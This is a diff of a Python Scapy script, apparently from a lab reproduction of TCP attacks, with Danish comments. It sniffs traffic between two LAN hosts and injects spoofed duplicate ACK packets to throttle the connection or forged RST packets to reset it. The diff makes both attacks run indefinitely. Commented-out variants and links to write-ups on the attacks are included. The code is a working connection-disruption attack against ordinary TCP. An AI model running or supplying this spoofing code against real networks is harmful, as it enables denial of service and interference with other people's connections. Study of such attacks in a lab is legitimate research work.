@@ -1,9 +1,6 @@
 
 from scapy.all import *
-
-WINDOWS_SIZE = 512
-tcp_rst_count = 10
-
+from random import randint
 
 def send_3_duplicate_ack(p):
 
@@ -15,21 +12,55 @@ def send_3_duplicate_ack(p):
     ack_val = p[TCP].ack
     flags = p[TCP].flags
 
+    # ack_packet = IP(src = dst_ip, 
+    #                 dst = src_ip) / TCP(sport = dst_port,    
+    #                                 dport = src_port, 
+    #                                 flags = "A",   #Set ACK flag
+    #                                 ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
+    #                                 seq = ack_val)
+
+    # ack_packet = IP(src = dst_ip, 
+    #                 dst = src_ip) / TCP(sport = dst_port,    
+    #                                 dport = src_port, 
+    #                                 flags = "A",   #Set ACK flag
+    #                                 ack = seq_val) # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
     ack_packet = IP(src = dst_ip, 
                     dst = src_ip) / TCP(sport = dst_port,    
-                                    dport = src_port, 
-                                    flags = "A",   #Set ACK flag
-                                    ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
-                                    seq = ack_val)
+                                    dport = src_port, flags = "A", ack = seq_val, seq = ack_val) / "Q"#/ "hejsa" # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
+
+    # er ACK pakker ligeglade med seq nummeret? Nu klager den over at hejsa beskeden er out of seq.. men det er jo også data jeg sender, ikke ack
+    # nej vent det giver da ingen mening? for den pakke jeg læser kigger vi på ack flaget.
+
+    # ack_packet = IP(src = dst_ip, 
+    #             dst = src_ip) / TCP(sport = dst_port,    
+    #                             dport = src_port, 
+    #                             flags = "A",   #Set ACK flag
+    #                             ack = seq_val + randint(1,40), # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
+    #                             seq = ack_val)
+    
+    # ack_packet = IP(src = dst_ip, 
+    #             dst = src_ip) / TCP(sport = dst_port,    
+    #                             dport = src_port, 
+    #                             ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
+    #                             seq = ack_val)
+
+    #ack_packet.show()
     
     # 3 duplicate ack packets will trigger "fast retransmit" at reciever
+    # send(ack_packet, verbose = 0)
+    # ack_packet[TCP].seq = ack_packet[TCP].seq + 1 
+    # send(ack_packet, verbose = 0)
+    # ack_packet[TCP].seq = ack_packet[TCP].seq + 1 
+    # send(ack_packet, verbose = 0)
+
+    #send(ack_packet)
     send(ack_packet, verbose = 0)
     send(ack_packet, verbose = 0)
-    send(ack_packet, verbose = 0) 
+
 
     # DET SER UD TIL AT THROTTLE. MEN KUN MEGET LIDT. CA FRA 9 til 11 sekunder
 
-    print("3 ACK packets was send!") 
+    #print("3 ACK packets was send!") 
 
     return
 
@@ -72,24 +103,38 @@ def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):
 
 
     if approach == "ACK":
-        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 200, prn = send_3_duplicate_ack) #NESP TÆNK OVER OM DET ER DET KORREKT AT SENDE 3 efter hver pakke
+        #sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 200, prn = send_3_duplicate_ack) #NESP TÆNK OVER OM DET ER DET KORREKT AT SENDE 3 efter hver pakke
+        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_3_duplicate_ack) # KØR UENDELIGT
+
+        # counter = 0
+        # while True:
+        #     single_packet = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 1)[0]
+        #     if not counter%3: # after 3 packets
+        #         #update ack packet
+        #         src_ip = single_packet[IP].src
+        #         src_port = single_packet[TCP].sport
+        #         dst_ip = single_packet[IP].dst
+        #         dst_port = single_packet[TCP].dport
+        #         seq_val = single_packet[TCP].seq
+        #         ack_val = single_packet[TCP].ack
+        #         flags = single_packet[TCP].flags
+        #         ack_packet = IP(src = dst_ip, 
+        #         dst = src_ip) / TCP(sport = dst_port,    
+        #                         dport = src_port, 
+        #                         flags = "A",   #Set ACK flag
+        #                         ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
+        #                         seq = ack_val)
+        #     send(ack_packet, verbose = 0) 
+        #     counter = counter+1
+                
+        ## https://reproducingnetworkresearch.wordpress.com/2017/06/05/cs244-17-reproducing-tcp-level-attacks-tcp-congestion-control-with-a-misbehaving-receiver/
 
     elif approach == "RST":
-        # seqs = range(package_sample[TCP].seq, max_seq, int(win / 2))
 
-        #sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 50) ## SKIP FIRST 100 PACKETS - to make sure there is a connection
-        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 50, prn = send_reset) 
+        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_reset) 
 
-        # while True:
-        #     newest_packet_list = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 1)
-        #     newest_packet = newest_packet_list[0]
+        ## https://robertheaton.com/2020/04/27/how-does-a-tcp-reset-attack-work/
 
-        #     dst_port = newest_packet[TCP].dport
-        #     src_port = newest_packet[TCP].sport
-        #     rst_packet = IP(src = dest_addr, dst = source_addr) / TCP(sport = dst_port, dport = src_port, flags = "R", seq = newest_packet[TCP].ack) # note: src and dst address and po is flipped on purpose!
-    
-        #     send(rst_packet, verbose = 0)
-        #     print("send")
     else:
         raise ValueError("Incorrect or invalid approach")
 
@@ -98,6 +143,19 @@ def main():
     
     #tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
     tcp_throttling("192.168.1.203", "192.168.1.73", "ACK")
+
+    # ack_packet = IP(src = "192.168.1.73", 
+    #         dst = "192.168.1.203") / TCP(sport = 123,    
+    #                         dport = 123, flags = "A", seq=42) 
+    # ack_packet = IP(src = "192.168.1.73", 
+    #     dst = "192.168.1.203") / TCP(sport = 123,    
+    #                     dport = 124, seq=42) 
+    # ack_packet.show()
+    # while True:
+    #     try:
+    #         send(ack_packet)
+    #     except:
+    #         print("fejl")
     
 
 if __name__ == "__main__":
